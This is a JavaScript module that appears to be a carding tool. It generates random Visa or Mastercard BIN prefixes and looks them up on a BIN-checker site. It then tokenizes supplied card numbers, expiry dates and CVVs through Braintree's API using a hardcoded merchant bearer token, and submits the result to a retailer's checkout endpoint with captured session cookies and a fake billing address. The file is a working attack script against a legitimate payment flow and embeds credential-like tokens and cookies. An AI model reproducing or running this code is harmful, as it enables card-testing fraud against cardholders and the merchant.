import * as cheerio from 'cheerio';

export async function get_tokens() {
    try {
        const request_get_bin_site = await fetch('https://www.vccgenerator.org/credit-card-validator/', {
            method: "GET",
        });

        // Get the response body as text (HTML)
        const response_get_bin_site = await request_get_bin_site.text();

        // Extract cookies from the response headers
        const cookies = request_get_bin_site.headers.get('set-cookie');

        // Extract CSRF token from the Set-Cookie header using a regex
        const xcsrfToken = cookies.match(/csrftoken=([^;]+)/)[1];

        // Load the HTML into Cheerio to parse it
        const $ = cheerio.load(response_get_bin_site);

        // Get the CSRF token value from the input field (if it's present in the HTML)
        const csrfToken = $('input[name="csrfmiddlewaretoken"]').val();

        // Return both tokens and the cookies
        return {
            csrfToken,      // CSRF token from the HTML (if exists)
            xcsrfToken,  // CSRF token from the cookie header 
        };
    } catch (error) {
        console.error("Error fetching tokens:", error);
        return { error: error.toString() };
    }
}


export async function check_bin(CsrfToken, XcsrfToken, bin) {

    console.log(`\n ✔  token   : ${CsrfToken} \n ✔  x-token : ${XcsrfToken} \n ✔  bin     : ${bin}`)

    try {
        const bin_request = await fetch("https://www.vccgenerator.org/fetchdata/get-bin-info/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.5",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "x-csrftoken": `${XcsrfToken}`,
                "x-requested-with": "XMLHttpRequest",
                "cookie": `csrftoken=${CsrfToken}`,
                "Referer": "https://www.vccgenerator.org/bin-checker/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            "body": `bincode=${bin}`,
            "method": "POST"
        });

        // Check if the request was successful
        if (!bin_request.ok) {
            throw new Error(`HTTP error! status: ${bin_request.status}`);
        }

        // Parse response as JSON
        const bin_response = await bin_request.json();

        console.log(` ✔  issuer  : ${bin_response?.binInfo?.issuer === "N/A" || bin_response?.binInfo?.issuer === undefined ? "none" : bin_response?.binInfo?.issuer}\n ✔  status  : ${bin_response?.binInfo?.country_name_x === "N/A" || bin_response?.binInfo?.country_name_x === undefined ? "faild" : "success"} `)

        return bin_response

    } catch (error) {
        console.error('Error in check_bin:', error);
        return { error: error.toString() };
    }

}

export function generateNumber(repeat, only_visa, only_master) {

    function make_num(only_visa, only_master) {
        // Randomly choose whether to start with 4 or 5
        const firstDigit = only_visa ? 4 : only_master ? 5 : Math.random() < 0.5 ? 4 : 5;
        //  Math.random() < 0.5 ? 4 : 5;

        // Randomly decide if 4 or 5 digits should remain the same
        const length = only_visa ? 4 : only_master ? 5 : Math.random() < 0.5 ? 4 : 5;

        // Generate the rest of the number
        let number = firstDigit.toString();

        // Add digits based on the selected length
        for (let i = 1; i < length; i++) {
            number += Math.floor(Math.random() * 10);
        }

        // Add random digits to complete the 6-digit number
        while (number.length < 6) {
            number += Math.floor(Math.random() * 10);
        }

        return parseInt(number);
    }

    const my_num = [];

    for (let i = 0; i < repeat; i++) {
        const number_by_make_num = make_num(only_visa, only_master);
        my_num.push(number_by_make_num);
    }

    console.log(` ✔ BINS :  ${my_num}`)

    return my_num

}

export async function graphql(cc, em, ey, cvv) {

    const request_brain = await fetch("https://payments.braintree-api.com/graphql", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.7",
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU3MjM3ODgsImp0aSI6IjQ3MjRhYWU0LWQ2NzEtNDQwMS05MjRjLTI0NGFmNjI3ZmE2NCIsInN1YiI6InFyOG45NjdmdnB2MmhxM3EiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InFyOG45NjdmdnB2MmhxM3EiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQXZlcnlVU0Vjb21tZXJjZSJ9fQ.DtO-4-1yCuybZ7QvKDip6eRmABgp7kwN33FPtKcx3yZOC-g2AG59eJuxne1O96CZQTTtRmd5w2Zb0EbrXCxu2w",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sec-gpc": "1",
            "Referer": "https://assets.braintreegateway.com/",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        },
        "body": JSON.stringify({
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "41fe2c69-f604-475f-b943-0ca53f1cc15b"
            }, "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": em,
                        "expirationYear": ey,
                        "cvv": cvv
                    },
                    "options": { "validate": false }
                }
            }, "operationName": "TokenizeCreditCard"
        }),
        "method": "POST"
    });

    const request_brain_json = await request_brain.json()

    return request_brain_json
}

export async function payment_information(tokencc) {

    const response = await fetch("https://cart.avery.com/rest/default/V1/carts/mine/payment-information", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.7",
            "content-type": "application/json",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "x-requested-with": "XMLHttpRequest",
            "cookie": "_dycnst=dg; _dyid=1702360905684752925; _dy_geo=IN.AS.IN_DL.IN_DL_New%20Delhi; _dy_df_geo=India..New%20Delhi; _dy_toffset=0; _dy_cs_dygroup=Dynamic%20Yield%20Experiences; _dyid_server=1702360905684752925; consumerId=8ae8804890dfd1200191c3f6b9e93a48; btid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb25zdW1lcklkIjoiOGFlODgwNDg5MGRmZDEyMDAxOTFjM2Y2YjllOTNhNDgiLCJpYXQiOjE3MjU1Njk2MTN9.XFZRwPY2cSzJZ6dfvVTOuCzWJp-SXGJ1qP2f4yKHso8; avy_ic=1; form_key=UuJHNrpAN5ui6M8m; avy_it=34.42; wwjH7clZ8E5v5BsgCqQ5zHYf9OlZ8dCB=NjA5MWVmYmU5ZTdhNmI2ZjA4NTFkYjYwYWU1ZmU4MWM6MTcyNjg0MzczOTAwMDo2YjY2Zjg0MjRhMjAzNTk2M2UyZTU3MmE2ZjkzYzU5NQ; _dycst=dk.w.c.ss.; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; section_data_clean=; form_key=UuJHNrpAN5ui6M8m; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; PHPSESSID=ou5cgmsvcqqbdna70sth9b7tr4; customerType=n; _dyjsession=nkuk7ewuss6p9ss2bpwpe6mcsh3oe0zg; dy_fs_page=cart.avery.com%2Fcheckout; _dy_csc_ses=nkuk7ewuss6p9ss2bpwpe6mcsh3oe0zg; _dy_cs_cookie_items=_dy_cs_dygroup; _dy_soct=1725637390!1229927.0'1302253.0'1342500.-67825'1342505.-67734'1342506.-67722'1342507.-67732'1992460.0'2158187.-67825'2255143.0'2255146.0'2255147.0!nkuk7ewuss6p9ss2bpwpe6mcsh3oe0zg~615860.-67825'615861.0'767394.0; intent_audience=low; private_content_version=452c4163ed8841b039f6aafd37fa4961; X-Magento-Vary=7715dd48a90eedde1911d0bf53ed42945fa94d5ff3fbf4aa170156ae93c946b7; section_data_ids={%22customer%22:1725637388%2C%22compare-products%22:1725637388%2C%22last-ordered-items%22:1725637452%2C%22cart%22:1725637452%2C%22directory-data%22:1725637388%2C%22captcha%22:1725637452%2C%22wishlist%22:1725637388%2C%22instant-purchase%22:1725637452%2C%22loggedAsCustomer%22:1725637388%2C%22multiplewishlist%22:1725637388%2C%22persistent%22:1725637388%2C%22review%22:1725637388%2C%22cordial%22:1725637452%2C%22recently_viewed_product%22:1725637388%2C%22recently_compared_product%22:1725637388%2C%22product_data_storage%22:1725637388%2C%22paypal-billing-agreement%22:1725637388}",
            "Referer": "https://cart.avery.com/checkout/",
            "Referrer-Policy": "strict-origin-when-cross-origin"
        },
        "body": JSON.stringify({
            "cartId": "6770850",
            "billingAddress":
            {
                "customerAddressId": "1494781",
                "countryId": "US",
                "regionId": "12",
                "regionCode": "CA",
                "region": "California",
                "customerId": "2936899",
                "street": ["1600 Fake Street",
                    "Apartment 1"],
                "company": "Fake Company",
                "telephone": "6019521325",
                "fax": null,
                "postcode": "94043",
                "city": "Mountain View",
                "firstname": "Jon",
                "lastname": "Doe",
                "middlename": null,
                "prefix": null,
                "suffix": null,
                "vatId": null,
                "customAttributes": [],
                "saveInAddressBook": null
            }, "paymentMethod": {
                "method": "braintree",
                "additional_data": {
                    "payment_method_nonce": `${tokencc}`,
                    "device_data": "{\"correlation_id\":\"b833a05562bec0fab54f4264f0eb1aca\"}",
                    "is_active_payment_token_enabler": true
                }
            }
        }),
        "method": "POST"
    });

    const response_json = await response.json()

    return response_json
}